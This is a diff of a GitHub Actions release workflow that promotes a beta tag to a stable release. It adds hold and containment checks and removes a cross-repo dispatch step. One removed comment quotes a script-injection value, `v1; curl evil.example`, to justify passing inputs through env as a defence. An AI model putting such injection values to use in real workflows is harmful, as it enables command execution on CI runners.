@@ -20,7 +20,7 @@ name: Promote stable
 #   4. Creates a non-prerelease GitHub Release at vX.Y.Z as a DRAFT.
 #      desktop-release.yml fires automatically and builds the stable DMG with
 #      --config.extraMetadata.version=X.Y.Z (override since the public repo's
-#      commit still has -beta.N in package.json).
+#      commit carries the previous stable's version in package.json).
 #   5. desktop-release.yml smokes that DMG, promotes the draft to published,
 #      and only then dispatches publish-stable to release.yml, which promotes
 #      the npm `latest` dist-tag using a transient package.json#version
@@ -36,12 +36,6 @@ name: Promote stable
 # deliberately NOT added here: this workflow holds the shared
 # `ok-release-cadence` lock at WORKFLOW level, so a 15-75 min build here
 # would block every beta cut for the duration.
-#
-# After a successful cut this dispatches main-reset.yml on
-# inkeep/agents-private (via the "Inkeep OK Release Bridge" App) to advance
-# the base for the next cycle — one-button promotion. When the bridge App
-# secrets are absent the dispatch skips and the engineer runs main-reset.yml
-# manually (two-button fallback).
 #
 # Concurrency group is shared with release.yml so beta cuts and stable
 # promotions never race on the same public-repo state.
@@ -63,9 +57,7 @@ name: Promote stable
 # installation UI, not something this workflow file can change. If the
 # installation lacks the grant, the App token has the same scope problem
 # as GITHUB_TOKEN and the `remote rejected` signature recurs on the next
-# stale-tree promotion. See sister workflow
-# .github/workflows/public-open-knowledge-main-reset.yml on agents-private
-# for the same primitive applied to the post-promotion cycle.
+# stale-tree promotion.
 
 on:
   workflow_dispatch:
@@ -97,7 +89,7 @@ permissions:
   # write.
   contents: write
   # Read-only: lets the dispatch steps resolve the run URLs of the workflows they
-  # trigger (release.yml, desktop-release.yml, main-reset) for run-to-run links.
+  # trigger (release.yml, desktop-release.yml) for run-to-run links.
   actions: read
 
 concurrency:
@@ -107,13 +99,14 @@ concurrency:
 jobs:
   read-bumps:
     name: Read changeset bumps (no release credential)
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04
     timeout-minutes: 10
     permissions:
       contents: read
     outputs:
       beta_tag: ${{ steps.resolve.outputs.beta_tag }}
       bump_verdicts: ${{ steps.bumps.outputs.bump_verdicts }}
+      note_levels: ${{ steps.levels.outputs.note_levels }}
     steps:
       - name: Checkout
         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
@@ -158,7 +151,7 @@ jobs:
       - name: Set up Node
         uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
         with:
-          node-version: "24"
+          node-version-file: .node-version
 
       - name: Install root dependencies for the Changesets reader
         run: |
@@ -174,10 +167,19 @@ jobs:
           set -euo pipefail
           node scripts/compute-stable-version.mjs "$BETA_TAG"
 
+      - name: Read the release-note level of every changeset the stable ships
+        id: levels
+        if: steps.bumps.outputs.skip != 'true'
+        env:
+          BETA_SHA: ${{ steps.bumps.outputs.beta_sha }}
+        run: |
+          set -euo pipefail
+          node scripts/render-stable-notes.mjs --read-levels --commit "$BETA_SHA"
+
   promote:
     name: Promote ${{ inputs.beta_tag || 'newest beta' }} to stable
     needs: read-bumps
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04
     cache-mode: none
     timeout-minutes: 20
     steps:
@@ -286,7 +288,7 @@ jobs:
       - name: Set up Node
         uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
         with:
-          node-version: "24"
+          node-version-file: .node-version
 
       - name: Compute stable version from beta tag
         id: ver
@@ -305,6 +307,23 @@ jobs:
           # to $GITHUB_OUTPUT. skip=true is a clean no-op (the beta is already
           # shipped, or adds no changesets) and gates every step below.
           node scripts/compute-stable-version.mjs "$BETA_TAG"
+
+      - name: Refuse a stable that carries the release hold
+        if: steps.ver.outputs.skip != 'true'
+        env:
+          BETA_TAG: ${{ steps.resolve.outputs.beta_tag }}
+          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
+          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
+        run: node .github/scripts/release-hold.mjs --candidate "$BETA_SHA" --label "${STABLE_TAG} from ${BETA_TAG}" --main HEAD
+
+      - name: Refuse a stable that lacks a fix a published stable shipped
+        if: steps.ver.outputs.skip != 'true'
+        env:
+          GH_TOKEN: ${{ steps.app-token.outputs.token }}
+          BETA_TAG: ${{ steps.resolve.outputs.beta_tag }}
+          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
+          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
+        run: node .github/scripts/shipped-fix-containment.mjs --candidate "$BETA_SHA" --label "${STABLE_TAG} from ${BETA_TAG}"
 
       - name: Link to triggering run
         # Back-link: who dispatched this promotion. Present on the automated path
@@ -327,6 +346,42 @@ jobs:
         with:
           origin: https://openknowledge.ai
           evidence-name: share-contract-promote-${{ github.run_id }}-${{ github.run_attempt }}
+
+      - name: Render release notes from the stable's changesets
+        id: changelog
+        if: steps.ver.outputs.skip != 'true'
+        env:
+          GH_TOKEN: ${{ steps.app-token.outputs.token }}
+          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
+          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
+          NOTE_LEVELS: ${{ needs.read-bumps.outputs.note_levels }}
+        run: |
+          set -euo pipefail
+          BODY_FILE=$(mktemp)
+          node scripts/render-stable-notes.mjs --commit "$BETA_SHA" --exclude-tag "$STABLE_TAG" > "$BODY_FILE"
+
+          if [[ ! -s "$BODY_FILE" ]]; then
+            printf 'No changelog entries.\n' > "$BODY_FILE"
+          fi
+
+          MAX_BODY=120000
+          if [[ $(wc -c < "$BODY_FILE") -gt $MAX_BODY ]]; then
+            echo "Release notes are $(wc -c < "$BODY_FILE") chars, over ${MAX_BODY}; truncating."
+            TRUNC=$(mktemp)
+            # Cut at MAX_BODY bytes, then drop the (now-partial) last line.
+            head -c "$MAX_BODY" "$BODY_FILE" | sed '$d' > "$TRUNC"
+            {
+              printf '\n\n---\n\n'
+              printf '_Changelog truncated to fit GitHub'\''s 125,000-character release-body limit. '
+              printf 'The notes for every release are at https://github.com/%s/releases_\n' "$GITHUB_REPOSITORY"
+            } >> "$TRUNC"
+            mv "$TRUNC" "$BODY_FILE"
+          fi
+
+          echo "body_file=$BODY_FILE" >> "$GITHUB_OUTPUT"
+          echo "---- Release body preview ----"
+          cat "$BODY_FILE"
+          echo "------------------------------"
 
       - name: Tag stable at beta SHA
         if: steps.ver.outputs.skip != 'true'
@@ -356,111 +411,6 @@ jobs:
               push origin "$STABLE_TAG"
           fi
 
-      - name: Aggregate beta release bodies since previous stable
-        id: changelog
-        if: steps.ver.outputs.skip != 'true'
-        env:
-          GH_TOKEN: ${{ steps.app-token.outputs.token }}
-          STABLE_TAG: ${{ steps.ver.outputs.stable_tag }}
-          BETA_SHA: ${{ steps.ver.outputs.beta_sha }}
-          # Pass the resolved beta tag via env to keep ${{ }} expression
-          # interpolation out of the run: block — direct ${{ }} substitution
-          # in shell is a script-injection foothold (a malicious tag value
-          # like `v1; curl evil.example` would expand textually before bash
-          # parsed the printf invocation). Defense-in-depth even though
-          # dispatching this workflow requires repo write access.
-          BETA_TAG_INPUT: ${{ steps.resolve.outputs.beta_tag }}
-        run: |
-          set -euo pipefail
-          BODY_FILE=$(mktemp)
-
-          # Resolve the previous stable tag (most recent tag matching v*.*.*
-          # without -beta suffix, ancestor of the beta SHA). May be empty for
-          # the first-ever stable.
-          PREV_STABLE=$(git tag --list 'v*' --sort=-version:refname \
-            --merged "$BETA_SHA" \
-            | grep -E '^v[0-9]+\.[0-9]+\.[0-9]+$' \
-            | grep -v "^${STABLE_TAG}$" \
-            | head -n 1 || true)
-
-          # Betas whose changes are in this stable = beta tags reachable from the
-          # promoted beta SHA but NOT from the previous stable. Under delta
-          # versioning the promoted beta's NAME (e.g. v0.30.1-beta.6) no longer
-          # matches the computed stable version (e.g. 0.30.2), so we range by
-          # commit ancestry (--merged/--no-merged), not a name glob.
-          if [[ -n "$PREV_STABLE" ]]; then
-            echo "Aggregating betas reachable from ${BETA_TAG_INPUT} but not ${PREV_STABLE}"
-            BETA_TAGS_IN_RANGE=$(git tag --list 'v*-beta.*' --merged "$BETA_SHA" --no-merged "$PREV_STABLE" --sort=version:refname | grep -E '^v[0-9]+\.[0-9]+\.[0-9]+-beta\.[0-9]+$' || true)
-          else
-            echo "No previous stable tag; aggregating all betas reachable from ${BETA_TAG_INPUT}"
-            BETA_TAGS_IN_RANGE=$(git tag --list 'v*-beta.*' --merged "$BETA_SHA" --sort=version:refname | grep -E '^v[0-9]+\.[0-9]+\.[0-9]+-beta\.[0-9]+$' || true)
-          fi
-
-          # Under the zero-commit-bump cadence, beta release bodies are the
-          # source of truth — packages/*/CHANGELOG.md no longer accumulates
-          # per-beta entries (only per-stable, written by main-reset's
-          # `pnpm exec changeset version` at promotion time). Each beta body carries
-          # ONLY the delta introduced in that beta (compute-next-beta.mjs filters
-          # against the prior beta's embedded consumed-set marker), so the cycle's
-          # betas concatenated are a clean, duplication-free set of the changes
-          # this stable ships.
-          #
-          # aggregate-stable-changelog.mjs regroups that concatenation into one
-          # section per bump level (Major/Minor/Patch, empty levels omitted) and
-          # emits no preamble of its own: the GitHub Release title already carries
-          # the version, and under delta versioning the promoted beta's name no
-          # longer equals the stable version, so the old "## X.Y.Z / Stable
-          # promotion of beta … / Aggregated changes since previous stable" header
-          # was both redundant and inaccurate. The script also drops the internal
-          # `<!-- ok-consumed-set: … -->` markers and the per-beta "Delta since
-          # previous beta" / "First beta of the cycle" lead lines.
-          RAW_BODIES=$(mktemp)
-          UNAVAILABLE=""
-          for tag in $BETA_TAGS_IN_RANGE; do
-            if BODY=$(gh release view "$tag" --json body --jq .body 2>/dev/null) && [[ -n "$BODY" ]]; then
-              printf '%s\n\n' "$BODY" >> "$RAW_BODIES"
-            else
-              UNAVAILABLE="${UNAVAILABLE:+$UNAVAILABLE, }${tag}"
-            fi
-          done
-
-          node scripts/aggregate-stable-changelog.mjs < "$RAW_BODIES" > "$BODY_FILE"
-
-          # A stable with no resolvable beta changelog (no betas in range, or
-          # every body empty/unavailable) still needs a non-empty release body.
-          if [[ ! -s "$BODY_FILE" ]]; then
-            printf 'No changelog entries.\n' > "$BODY_FILE"
-          fi
-
-          # Surface any beta whose body could not be fetched so its changes are
-          # not silently missing from the aggregated notes.
-          if [[ -n "$UNAVAILABLE" ]]; then
-            printf '\n_Release body unavailable for: %s — see the per-beta releases for those changes._\n' "$UNAVAILABLE" >> "$BODY_FILE"
-          fi
-
-          # GitHub rejects release bodies over 125,000 chars with HTTP 422.
-          # A long beta cycle (dozens of betas, each contributing its delta)
-          # can blow past that. Cap with margin and point readers at the full
-          # per-beta history rather than failing the whole promotion.
-          MAX_BODY=120000
-          if [[ $(wc -c < "$BODY_FILE") -gt $MAX_BODY ]]; then
-            echo "Aggregated body $(wc -c < "$BODY_FILE") chars exceeds ${MAX_BODY}; truncating."
-            TRUNC=$(mktemp)
-            # Cut at MAX_BODY bytes, then drop the (now-partial) last line.
-            head -c "$MAX_BODY" "$BODY_FILE" | sed '$d' > "$TRUNC"
-            {
-              printf '\n\n---\n\n'
-              printf '_Changelog truncated to fit GitHub'\''s 125,000-character release-body limit. '
-              printf 'Full per-beta history: https://github.com/%s/releases_\n' "$GITHUB_REPOSITORY"
-            } >> "$TRUNC"
-            mv "$TRUNC" "$BODY_FILE"
-          fi
-
-          echo "body_file=$BODY_FILE" >> "$GITHUB_OUTPUT"
-          echo "---- Release body preview ----"
-          cat "$BODY_FILE"
-          echo "------------------------------"
-
       - name: Create stable GitHub Release
         if: steps.ver.outputs.skip != 'true'
         env:
@@ -473,15 +423,8 @@ jobs:
           # Idempotency: a re-run after a transient failure should not
           # explode if the Release already exists.
           if gh release view "$STABLE_TAG" >/dev/null 2>&1; then
-            # Idempotent re-run after a transient failure (e.g., the draft
-            # was created but desktop-release.yml never promoted it). The
-            # combined PATCH (--draft=false + --prerelease=false + --latest)
-            # is empirically atomic: GitHub evaluates the make_latest
-            # constraint against the post-request state, so the draft→
-            # published flip and Latest stamp succeed in a single call.
-            # No-op on an already-published release.
-            echo "Release ${STABLE_TAG} already exists; updating notes + ensuring published + --latest."
-            gh release edit "$STABLE_TAG" --notes-file "$BODY_FILE" --draft=false --prerelease=false --latest
+            echo "Release ${STABLE_TAG} already exists; updating notes and preserving publication state."
+            gh release edit "$STABLE_TAG" --notes-file "$BODY_FILE"
           else
             # Create as draft so the release is invisible in the .atom feed
             # until desktop-release.yml uploads latest-mac.yml AND promotes
@@ -541,73 +484,3 @@ jobs:
             if [[ -n "$CHILD" ]]; then echo "- Run: ${CHILD}"; else echo "- (run link unresolved; open desktop-release.yml)"; fi
             echo "- That run smokes the DMG, promotes the draft Release, then dispatches publish-stable to release.yml for npm. npm \`latest\` does NOT move until the smoke passes."
           } >> "$GITHUB_STEP_SUMMARY"
-
-      - name: Detect bridge App for cross-repo dispatch
-        if: steps.ver.outputs.skip != 'true'
-        # Auto-triggering main-reset.yml on agents-private needs a credential
-        # with write access to THAT repo; the workflow-default GITHUB_TOKEN is
-        # scoped to the public repo only and cannot dispatch cross-repo. The
-        # "Inkeep OK Release Bridge" GitHub App supplies it: installed on
-        # agents-private, its App-ID + private key live in the public repo's
-        # secrets, and the next step mints a short-lived installation token
-        # at runtime (no static
-        # long-lived token stored). If the App secrets are absent the bridge
-        # is not configured — skip silently and promotion stays two-button
-        # (engineer runs main-reset.yml manually). Secrets cannot be read in
-        # `if:` expressions, so the presence check runs here and gates the
-        # mint + dispatch steps via an output.
-        id: bridge-check
-        env:
-          OK_RELEASE_BRIDGE_APP_ID: ${{ secrets.OK_RELEASE_BRIDGE_APP_ID }}
-        run: |
-          set -euo pipefail
-          if [[ -n "${OK_RELEASE_BRIDGE_APP_ID:-}" ]]; then
-            echo "configured=true" >> "$GITHUB_OUTPUT"
-          else
-            echo "configured=false" >> "$GITHUB_OUTPUT"
-            echo "OK_RELEASE_BRIDGE_APP_ID not set — skipping auto-trigger of main-reset; promotion stays two-button (run main-reset.yml manually on agents-private)."
-          fi
-
-      - name: Mint cross-repo dispatch token (bridge App)
-        if: steps.bridge-check.outputs.configured == 'true'
-        id: bridge-token
-        uses: actions/create-github-app-token@1b10c78c7865c340bc4f6099eb2f838309f1e8c3 # v3.1.1
-        with:
-          # Public client ID for inkeep-ok-release-bridge (non-secret; supersedes the deprecated app-id input).
-          client-id: Iv23lii4qS2FAc6tkzfI
-          private-key: ${{ secrets.OK_RELEASE_BRIDGE_APP_PRIVATE_KEY }}
-          # The bridge App is installed on agents-private, not on the public
-          # repo (where this workflow runs). owner + repositories scope the minted
-          # token to that cross-repo installation.
-          owner: inkeep
-          repositories: agents-private
-
-      - name: Trigger main-reset on agents-private
-        if: steps.bridge-check.outputs.configured == 'true'
-        env:
-          GH_TOKEN: ${{ steps.bridge-token.outputs.token }}
-          STABLE_VERSION: ${{ steps.ver.outputs.stable_version }}
-          # JSON array of changeset IDs this stable consumed. main-reset consumes
-          # ONLY these and leaves later changesets pending, so the anchor advances
-          # exactly one stable per promotion without stranding newer work.
-          DELTA_IDS: ${{ steps.ver.outputs.delta_ids }}
-        run: |
-          set -euo pipefail
-          SELF_URL="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}"
-          SINCE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
-          payload=$(jq -nc --arg v "$STABLE_VERSION" --argjson d "${DELTA_IDS:-[]}" --arg by "$SELF_URL" \
-            '{event_type: "main-reset", client_payload: {stable_version: $v, delta_ids: $d, dispatched_by: $by}}')
-          gh api -X POST "repos/inkeep/agents-private/dispatches" --input - <<<"$payload"
-          # Best-effort cross-repo forward-link (the bridge token reads agents-private).
-          CHILD=""
-          for _ in 1 2 3 4 5 6; do
-            CHILD=$(gh run list --repo inkeep/agents-private --workflow=public-open-knowledge-main-reset.yml --event=repository_dispatch --limit 8 --json url,createdAt \
-              --jq "[.[] | select(.createdAt >= \"$SINCE\")] | sort_by(.createdAt) | last | .url // empty" 2>/dev/null || true)
-            [[ -n "$CHILD" ]] && break
-            sleep 3
-          done
-          {
-            echo "### Dispatched main-reset (agents-private)"
-            if [[ -n "$CHILD" ]]; then echo "- Run: ${CHILD}"; else echo "- (run link unresolved; open the main-reset workflow on agents-private)"; fi
-          } >> "$GITHUB_STEP_SUMMARY"
-          echo "Dispatched main-reset to agents-private (stable_version=${STABLE_VERSION}, delta_ids=${DELTA_IDS})."
